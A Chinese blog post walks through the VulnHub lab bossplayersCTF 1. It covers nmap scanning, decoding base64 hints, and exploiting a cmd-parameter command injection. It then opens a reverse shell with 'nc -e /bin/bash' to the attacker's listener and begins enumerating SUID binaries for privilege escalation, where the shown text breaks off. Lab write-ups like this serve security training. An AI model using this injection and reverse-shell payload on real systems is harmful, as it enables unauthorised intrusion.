@@ -1,0 +1,325 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="复习一个简单的靶场，下一个复习的靶场难度还是挺大的"><title>Bossplayerctf 1 Vulunhub靶场复现-重走来时路5</title><link rel=canonical href=https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF5/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="Bossplayerctf 1 Vulunhub靶场复现-重走来时路5"><meta property='og:description' content="复习一个简单的靶场，下一个复习的靶场难度还是挺大的"><meta property='og:url' content='https://ke1thli.github.io/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF5/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-08-10T00:00:00+00:00'><meta property='article:modified_time' content='2026-08-10T00:00:00+00:00'><meta name=twitter:title content="Bossplayerctf 1 Vulunhub靶场复现-重走来时路5"><meta name=twitter:description content="复习一个简单的靶场，下一个复习的靶场难度还是挺大的"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#靶场介绍与搭建>靶场介绍与搭建</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞脚本探测>漏洞脚本探测</a></li></ol></li><li><a href=#漏洞寻找和利用>漏洞寻找和利用</a></li><li><a href=#80端口访问>80端口访问</a><ol><li><a href=#robotstxt-访问>robots.txt 访问</a></li><li><a href=#访问workinginprogressphp>访问workinginprogress.php</a></li></ol></li><li><a href=#验证命令注入漏洞>验证命令注入漏洞</a></li><li><a href=#命令注入shell和反弹shell>命令注入shell和反弹shell</a></li><li><a href=#权限提升>权限提升</a><ol><li><a href=#sudo-提权尝试>sudo 提权尝试</a></li><li><a href=#suid提权尝试>suid提权尝试</a></li></ol></li><li><a href=#提权成功>提权成功</a></li><li><a href=#flag-又是base64>flag 又是base64</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/bossplayerctf-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF5/>Bossplayerctf 1 Vulunhub靶场复现-重走来时路5</a></h2><h3 class=article-subtitle>复习一个简单的靶场，下一个复习的靶场难度还是挺大的</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-08-10T00:00:00Z>Monday, August 10, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#靶场介绍与搭建>靶场介绍与搭建</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞脚本探测>漏洞脚本探测</a></li></ol></li><li><a href=#漏洞寻找和利用>漏洞寻找和利用</a></li><li><a href=#80端口访问>80端口访问</a><ol><li><a href=#robotstxt-访问>robots.txt 访问</a></li><li><a href=#访问workinginprogressphp>访问workinginprogress.php</a></li></ol></li><li><a href=#验证命令注入漏洞>验证命令注入漏洞</a></li><li><a href=#命令注入shell和反弹shell>命令注入shell和反弹shell</a></li><li><a href=#权限提升>权限提升</a><ol><li><a href=#sudo-提权尝试>sudo 提权尝试</a></li><li><a href=#suid提权尝试>suid提权尝试</a></li></ol></li><li><a href=#提权成功>提权成功</a></li><li><a href=#flag-又是base64>flag 又是base64</a></li></ol></nav></details></aside><section class=article-content><h1 id=bossplayerctf-vulnhub-靶场复现>BossplayerCTF VulnHub 靶场复现</h1><h2 id=靶场介绍与搭建>靶场介绍与搭建</h2><p>下载地址 <a class=link href=https://www.vulnhub.com/entry/bossplayersctf-1,375/ target=_blank rel=noopener>https://www.vulnhub.com/entry/bossplayersctf-1,375/</a></p><p>介绍</p><p>Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF&rsquo;s. It should take around 30 minutes to root.</p><p>This works better with VirtualBox rather than VMware</p><p>看来是很简单了</p><p>靶场搭建</p><p>作者既然推荐搭建在VirtualBox就搭建在VirtualBox，网卡选择hostonly模式，来到VMware的kali自然是桥接网卡设置为VIrtualBox的网卡</p><p>这里由于我下载的是学长改的ovf格式靶机（只修改网卡配置支持VMware nat模式），就搭建在VMware，靶机，攻击机均为nat</p><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></td></tr></table></div></div><p>10.10.10.136 是靶机的ip</p><h3 id=端口扫描>端口扫描</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --min-rate <span class=m>1000</span> -p- 10.10.10.136         
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-08-10 01:44 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.136
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0016s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:B6:37:20 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -p22,80 -sS -A 10.10.10.136     
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-08-10 01:45 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.136
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0011s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.9p1 Debian <span class=m>10</span> <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.38 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.38 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:B6:37:20 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running: Linux 3.X<span class=p>|</span>4.X
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 4.14
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>TRACEROUTE
+</span></span><span class=line><span class=cl>HOP RTT     ADDRESS
+</span></span><span class=line><span class=cl><span class=m>1</span>   1.15 ms 10.10.10.136
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.65 seconds
+</span></span></code></pre></td></tr></table></div></div><h3 id=漏洞脚本探测>漏洞脚本探测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap --script<span class=o>=</span>vuln -p22,80 10.10.10.136       
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-08-10 01:47 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.136
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0011s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-csrf: Couldn<span class=s1>&#39;t find any CSRF vulnerabilities.
+</span></span></span><span class=line><span class=cl><span class=s1>|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-stored-xss: Couldn<span class=err>&#39;</span>t find any stored XSS vulnerabilities.
+</span></span><span class=line><span class=cl><span class=p>|</span> http-enum: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   /logs.php: Logs
+</span></span><span class=line><span class=cl><span class=p>|</span>_  /robots.txt: Robots file
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:B6:37:20 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=漏洞寻找和利用>漏洞寻找和利用</h2><p>由于爆出个robots.txt路径，加上难度不大，先不进行目录扫描，卡住了，再回来看看</p><h2 id=80端口访问>80端口访问</h2><p>网站内容，前端源代码藏有注释</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl><span class=gu>## bossplayers CTF - created by Cuong Nguyen
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Difficulty Level: [* ] [ ] [ ] [ ] [ ]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Description: Hello! Extremely easy CTF that I created for those who want to get their feet wet. Have a methodology and avoid the rabit holes! I hope you enjoy this and most importantly, please have fun!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Website: sudocuong.com
+</span></span></code></pre></td></tr></table></div></div><p>非常简短，提示我们注意有坑</p><p>下面是前端源代码注释</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK--&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>辨认出这是base64，开始解码操作,还是多层嵌套</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K               
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl><span class=nv>d29ya2luZ2lucHJvZ3Jlc3MucGhwCg</span><span class=o>==</span>
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>workinginprogress.php
+</span></span></code></pre></td></tr></table></div></div><p>暴露一个新路径</p><h3 id=robotstxt-访问>robots.txt 访问</h3><p>super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg== 简短一句话，也是base64</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;bG9sIHRyeSBoYXJkZXIgYnJvCg==&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>lol try harder bro
+</span></span></code></pre></td></tr></table></div></div><p>这就是坑吗</p><h3 id=访问workinginprogressphp>访问workinginprogress.php</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1>### System Install:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Linux Debian - <span class=o>[</span>*<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>APACHE2 - <span class=o>[</span>*<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PHP - <span class=o>[</span>*<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>### Outstanding:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Test ping <span class=nb>command</span> - <span class=o>[</span> <span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Fix Privilege Escalation - <span class=o>[</span> <span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>### Completed:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Say Hi to Haley - <span class=o>[</span>*<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=验证命令注入漏洞>验证命令注入漏洞</h2><p>test ping command 也许是一个命令注入漏洞，?cmd get传参尝试</p><p>http://10.10.10.136/workinginprogress.php?cmd=ls</p><p>下方多一行 index.html logs.php robots.txt workinginprogress.php</p><p>继续验证</p><p>?cmd=whoami 回显 www-data</p><p>?cmd=pwd 回显 /var/www/html</p><p>目前可以确认是一个漏洞了，尝试有无写入webshell的可能</p><h2 id=命令注入shell和反弹shell>命令注入shell和反弹shell</h2><p>在终端输入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nc -lvnp <span class=m>8888</span>
+</span></span></code></pre></td></tr></table></div></div><p>传参为 ?cmd=nc%20-e%20/bin/bash%2010.10.10.10%208888</p><p>理所应当反弹shell 了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Bossplayerctf<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ nc -lvnp <span class=m>8888</span>                    
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>8888</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.10.10<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.136<span class=o>]</span> <span class=m>58978</span>
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>index.html
+</span></span><span class=line><span class=cl>logs.php
+</span></span><span class=line><span class=cl>robots.txt
+</span></span><span class=line><span class=cl>workinginprogress.php
+</span></span></code></pre></td></tr></table></div></div><p>python -c &lsquo;import pty;pty.spawn("/bin/bash")&rsquo; 升级交互shell</p><h2 id=权限提升>权限提升</h2><h3 id=sudo-提权尝试>sudo 提权尝试</h3><p>根据super secret password 前面的提示，当然大概率是错的，验证了就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bossplayers:/var/www/html$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>bash: sudo: <span class=nb>command</span> not found
+</span></span><span class=line><span class=cl>www-data@bossplayers:/var/www/html$ 
+</span></span></code></pre></td></tr></table></div></div><h3 id=suid提权尝试>suid提权尝试</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bossplayers:/var/www/html$ find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/bin/mount
+</span></span><span class=line><span class=cl>/usr/bin/umount
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/su
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/grep
